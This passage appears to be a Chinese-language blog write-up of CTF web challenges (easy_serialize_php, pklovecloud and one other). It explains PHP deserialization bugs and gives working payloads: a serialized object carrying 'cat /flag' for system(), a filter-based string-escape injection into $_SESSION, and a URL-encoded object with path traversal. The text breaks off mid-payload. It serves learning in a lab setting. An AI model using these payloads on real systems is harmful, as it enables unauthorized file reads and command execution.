class="keyword">class</span> <span class="title">Ha</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start2</span>=<span class="string">&quot;11111&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Ha</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;start1=<span class="keyword">new</span> <span class="title class_">Rd</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;start=[<span class="string">&#x27;POC&#x27;</span>=&gt;<span class="string">&#x27;1111&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span>-&gt;start1-&gt;cl=<span class="keyword">new</span> <span class="title class_">Er</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><font style="color:#000000;">先按照题目的内容写几个类和对象（其中 Flag 要赋值为 ‘cat &#x2F;flag’，之后要用到 system 函数输出）。从 Ha 入手，由于从 c1 在 Rd 内，所以先给 a 中 start1 用类 Rd 赋值，并把其中键 POC 对应的值赋值为 “1111“,之后用 Er 类给 c1 赋值，之后输出 a。这样就满足条件了。</font></p><p><font style="color:#000000;">输出结果为</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:2:&quot;Ha&quot;:3:&#123;s:5:&quot;start&quot;;a:1:&#123;s:3:&quot;POC&quot;;s:4:&quot;1111&quot;;&#125;s:6:&quot;start1&quot;;O:2:&quot;Rd&quot;:3:&#123;s:6:&quot;ending&quot;;N;s:2:&quot;cl&quot;;O:2:&quot;Er&quot;:2:&#123;s:6:&quot;symbol&quot;;N;s:4:&quot;Flag&quot;;s:9:&quot;cat /flag&quot;;&#125;s:3:&quot;poc&quot;;N;&#125;s:6:&quot;start2&quot;;s:5:&quot;11111&quot;;&#125;</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">传入参数</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?Ha_rde_r=O:2:&quot;Ha&quot;:3:&#123;s:5:&quot;start&quot;;a:1:&#123;s:3:&quot;POC&quot;;s:4:&quot;1111&quot;;&#125;s:6:&quot;start1&quot;;O:2:&quot;Rd&quot;:3:&#123;s:6:&quot;ending&quot;;N;s:2:&quot;cl&quot;;O:2:&quot;Er&quot;:2:&#123;s:6:&quot;symbol&quot;;N;s:4:&quot;Flag&quot;;s:9:&quot;cat /flag&quot;;&#125;s:3:&quot;poc&quot;;N;&#125;s:6:&quot;start2&quot;;s:5:&quot;11111&quot;;&#125;</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">拿到 flag</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737513460231-deb60d72-66b2-4c9c-b4ca-4d748f21d207.png"></p><h2 id="（三）-安洵杯-2019-easy-serialize-php"><a href="#（三）-安洵杯-2019-easy-serialize-php" class="headerlink" title="（三）[安洵杯 2019]easy_serialize_php"></a><font style="color:#000000;">（三）</font><font style="color:#000000;">[安洵杯 2019]easy_serialize_php</font></h2><p><font style="color:#000000;">进入靶场发现这个连接</font></p><h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737528784678-2dd6ad78-1996-46b4-9ef1-b02d878e3521.png"></h2><p><font style="color:#000000;">点进入发现是一串 PHP 代码</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737528891440-f39ba9da-f8d9-4c83-9687-ac38e5d02f25.png"></p><p><font style="color:#000000;">注意到：</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737529440871-a0f46fae-8c14-4861-b69a-4cffd7f35684.png"></p><p><font style="color:#000000;">进去之后注意到可疑文件</font><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737529464933-0c1808aa-ce5f-46ae-8f21-a29d42a23647.png"></p><p><font style="color:#000000;">下面还有这一段代码，存在反序列化，应该就是入口了</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737529555759-cb2d90b5-7859-4998-b696-6d5adf24ff32.png"></p><p><font style="color:#000000;">先尝试把 f 赋值为 show_image,之后出现以下界面</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737529522386-4dc771fa-6d1d-4a84-8507-587948e47919.png"></p><p><font style="color:#000000;">没有头绪，先分析代码吧</font></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">GET 传参</font></p><p><font style="color:#000000;"></font></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">把php、flag、php5、php4和flig 替换为为空字符串</font></p><p><font style="color:#000000;"></font></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">对$_SESSION 重新赋值，user 对应 guest，function 对应$function</font></p><p><font style="color:#000000;"></font></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="variable">$function</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">如果 function 为 0，则输出该页面</font></p><p><font style="color:#000000;"></font></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">sha1</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">GET 传参 img_path，如果 img_path 为 0，则对guest_img.png 进行 base64 加密，否则就对 img_path 先进行 base64 加密，再进行 sha1 加密</font></p><p><font style="color:#000000;"></font></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>);</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">对$_SESSION 序列化的值进行过滤并赋值给serialize_info </font></p><p><font style="color:#000000;"></font></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">最后就是对 function 的判断</font></p><ul><li><font style="color:#000000;">如果 function 的值为highlight_file，则输出该页面</font></li><li><font style="color:#000000;">如果 function 的值为 phpinfo，则输出该 PHP 代码的信息</font></li><li><font style="color:#000000;">如果 function的值为 show_image 则把serialize_info 进行反序列化并赋值给 userinfo，并输出 base64 解密后的 userinfo 的 img。</font></li></ul><p><font style="color:#000000;"></font></p><p><font style="color:#000000;">所以本体的思路为：</font></p><p><font style="color:#000000;">该 PHP 代码会将userinfo中的[‘img’]值做base64解码，然后吧提到的整个文件读入一个字符串中，所以我们就要构造img的值，让代码读出内容，经过上文的分析，想要修改img的值可以通过设置img_path，或者修改userinfo[‘img’]的内容</font></p><p><font style="color:#000000;">首先看修改img_path</font></p><p><font style="color:#000000;">这个方法有一个小问题，修改img_path，传入的内容会被base64和sha1加密，然而，高亮文件内容时只做了base64的解密，没有 sha1 解密，所以修改img_path是无法读到文件的，所以只能修改userinfo[‘img’] 的内容</font></p><p><font style="color:#000000;">userinfo[‘img’]的内容由_SESSION组成，所以我们可以修改user和function，考虑到有过滤，可以采用反序列化字符逃逸来构造SESSION[‘img’]的值，其中ZDBnM19mMWFnLnBocA&#x3D;&#x3D;是 d0g3_f1ag.php 的 base64 编码后的结果</font></p><p><font style="color:#000000;">关于本题的键值逃逸</font></p><ul><li><font style="color:#000000;">因为序列化的字符串是严格的，对应的格式不能错，比如s:4:“name”,那s:4就必须有一个字符串长度是4的否则就往后要。</font></li><li><font style="color:#000000;">并且反序列化会把多余的字符串当垃圾处理，在花括号内的就是正确的，花括号外的就都被扔掉。</font></li></ul><p><font style="color:#000000;">先构造img属性</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737533856994-7dab4b74-deae-47b9-9baa-38dfb2e449d2.png"></p><p><font style="color:#000000;">即</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;; </span><br></pre></td></tr></table></figure><p><font style="color:#000000;">之后我们要确定_SESSION[ ] 里面的东西：</font></p><p><font style="color:#000000;">原字符串：</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;s:7:&quot;phpflag&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">经过filter过滤后phpflag就会被替换成空字符串</font></p><p><font style="color:#000000;">所以 s:7:“phpflag”就变成了 s:7:””</font></p><ul><li><font style="color:#000000;">但是这里会出现问题，因为这里要求的字符串的长度为7，但是这里却是空字符串。所以它会向后索取字符串。直到长度正好为7。细心的话，可以看到 “;s:48: 这个字符串的长度正好为7</font></li></ul><p><font style="color:#000000;">当phpflag被替换成空字符串时，原本的键值对就变成：</font></p><ul><li><font style="color:#000000;">第一个变量的名： s:7:””;s:48:”;</font></li><li><font style="color:#000000;">第一个变量的值： s:1:“1”;</font></li><li><font style="color:#000000;">第二个变量的名： s:3:“img”;</font></li><li><font style="color:#000000;">第二个变量的值： s:20:“ZDBnM19mMWFnLnBocA&#x3D;&#x3D;”;</font></li></ul><p><font style="color:#000000;">再加上PHP序列化的严格规定，会把后面多余的字符串丢弃。就变成了：</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:1:&#123;s:7:&quot;&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">所以构造 playload:</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[phpflag]=;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737535582456-f7751974-76ce-4244-8b8b-acfd1f05c952.png"></p><p><font style="color:#000000;">但是页面源代码出现了这个，所以在进行对&#x2F;d0g3_fllllllag base64 加密</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737535582402-5bc666a5-f79a-40e5-8d81-0d2a4fe79f4d.png"></p><p><font style="color:#000000;">所以最终 playload 为</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://node7.anna.nssctf.cn:21451/index.php?f=show_image</span><br><span class="line">_SESSION[phpflag]=;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737535703721-547eefe4-059f-470b-9a88-40651d8cf4a3.png"></p><h2 id="（四）-第五空间-2021-pklovecloud"><a href="#（四）-第五空间-2021-pklovecloud" class="headerlink" title="（四）[第五空间 2021]pklovecloud"></a><font style="color:#000000;">（四）</font><font style="color:#000000;">[第五空间 2021]pklovecloud</font></h2><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737540928424-8c312bde-7fef-464f-add1-0975c2871ed3.png"></p><p><font style="color:#000000;">分析代码</font></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pkshow</span> </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">echo_name</span>(<span class="params"></span>)     </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Pk very safe^.^&quot;</span>;      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><ul><li><font style="color:#000000;">把 flag.php 文件包含进来</font></li><li><font style="color:#000000;">定义了一个类 pkshow</font><ul><li><font style="color:#000000;">在类中定义了一个函数 echo_name()</font></li><li><font style="color:#000000;">返回值为  Pk very safe^.^</font></li></ul></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">acp</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$cinder</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$neutron</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nova</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function">    </span>&#123;      </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cinder = <span class="keyword">new</span> pkshow;</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;cinder)  </span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;cinder-&gt;<span class="title function_ invoke__">echo_name</span>();      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><ul><li><font style="color:#000000;">定义了一个类 acp</font></li><li><font style="color:#000000;">类中有 public 成员 neutron 和 nova 以及 protected 成员 cinder</font></li><li><font style="color:#000000;">使用魔术方法__construct() ，在对象被创建时调用</font><ul><li><font style="color:#000000;">新建立一个对象并赋值给 cinder</font></li></ul></li><li><font style="color:#000000;">使用魔术方法__toString()， 类被当成字符串时的回应方法</font><ul><li><font style="color:#000000;">先判断 cinder 是否为随机值，如果是则返回 echo_name 函数的值</font></li></ul></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ace</span></span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;     </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$openstack</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$docker</span>; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">echo_name</span>(<span class="params"></span>)      </span></span><br><span class="line"><span class="function">    </span>&#123;   </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;openstack = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$this</span>-&gt;docker);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;openstack-&gt;neutron = <span class="variable">$heat</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;openstack-&gt;neutron === <span class="variable language_">$this</span>-&gt;openstack-&gt;nova)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="string">&quot;./<span class="subst">&#123;$this-&gt;filename&#125;</span>&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>)         </span><br><span class="line">            &#123;              </span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>); </span><br><span class="line">            &#125;  </span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">            &#123; </span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;keystone lost~&quot;</span>; </span><br><span class="line">            &#125;    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><font style="color:#000000;">定义了一个类 ace</font></li><li><font style="color:#000000;">公有成员为filename、openstack、docker</font></li><li><font style="color:#000000;">定义函数 echo_name()</font><ul><li><font style="color:#000000;">对docker 进行反序列化并把值赋值给openstack</font></li><li><font style="color:#000000;">把 heat 赋值给 openstack 中的 neutron</font></li></ul></li><li><font style="color:#000000;">判断 openstack 中的 neutron 的值是否与 openstack 中 nova 的值相等</font><ul><li><font style="color:#000000;">如果相等则把 filename 的值赋值给 file</font></li><li><font style="color:#000000;">判断 file 里是否有内容</font><ul><li><font style="color:#000000;">如果有则返回 file 文件的内容</font></li><li><font style="color:#000000;">否则返回keystone lost~</font></li></ul></li></ul></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pks&#x27;</span>])  </span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$logData</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pks&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$logData</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(__file__); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><font style="color:#000000;">这判断 pks 是否是随机值</font></li><li><font style="color:#000000;">如果是随机值则把 pks 反序列化的值赋值给 logData 并输出其值</font></li><li><font style="color:#000000;">否则显示代码</font></li></ul><p><font style="color:#000000;">pks 要是我们序列化的代码，</font></p><p><font style="color:#000000;">所以构造序列化代码：</font></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">acp</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$cinder</span> ; </span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$neutron</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$nova</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function">  </span>&#123;      </span><br><span class="line">    <span class="variable language_">$this</span>-&gt;cinder = <span class="keyword">new</span> ace;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ace</span></span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$filename</span> = <span class="string">&#x27;flag.php&#x27;</span>;     </span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$openstack</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$docker</span>;        </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>= <span class="keyword">new</span> <span class="title function_ invoke__">ace</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;docker = <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title function_ invoke__">acp</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">其中要把 flag.php 的内容赋值给 filename 方便以后打开文件，并且 docker 要为空从而使得neutron 与 nova 相等。</font></p><p><font style="color:#000000;">输出结果：</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737542997735-3053bd85-5855-4a4d-a581-06cf53e79893.png"></p><p><font style="color:#000000;">即</font></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>acp%<span class="number">22</span>%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>cinder%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>ace%<span class="number">22</span>%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>filename%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>flag.php%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span>openstack%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>docker%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>B%<span class="number">7</span>Ds%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>neutron%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>nova%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">所以传上去看看</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737542979421-636612da-89af-4605-b27b-00537eda5aa7.png"></p><p><font style="color:#000000;">查看源代码得到这个，提示我们 flag 在 &#x2F;nssctfasdasdflag 这里</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737542979379-499e771e-ffa1-4afd-a046-3df242219a14.png"></p><p><font style="color:#000000;">所以把 flag.php 改为nssctfasdasdflag 在输出一遍即可</font></p><p><font style="color:#000000;">playload:</font></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?pks=O%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>acp%<span class="number">22</span>%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>cinder%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>ace%<span class="number">22</span>%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>filename%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A34%<span class="number">3</span>A%<span class="number">22</span>..%<span class="number">2</span>F..%<span class="number">2</span>F..%<span class="number">2</span>F..%<span class="number">2</span>F..%<span class="number">2</span>F..%<span class="number">2</span>Fnssctfasdasdflag%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span>openstack%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span 